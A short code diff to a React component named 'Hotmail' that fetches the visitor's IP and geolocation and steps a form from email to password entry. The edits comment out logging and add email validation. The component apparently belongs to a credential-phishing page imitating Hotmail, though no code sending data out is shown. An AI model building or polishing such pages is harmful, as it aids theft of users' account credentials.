@@ -39,13 +39,13 @@ export default function Hotmail() {
       });
   }, []);
 
-  console.log(ip);
+  // console.log(ip);
 
   useEffect(() => {
     if (ip !== null) {
       getLocationDetails(ip, setLoading)
         .then((location) => {
-          console.log(location);
+          // console.log(location);
           setCountry(location.country);
           setCity(location.city);
           setRegion(location.region);
@@ -59,6 +59,10 @@ export default function Hotmail() {
 
   const togglePassword = (e) => {
     e.preventDefault();
+
+    if (emailValue === "") {
+      return setError("enter a valid email");
+    }
 
     setEmail(false);
     setPassword(true);
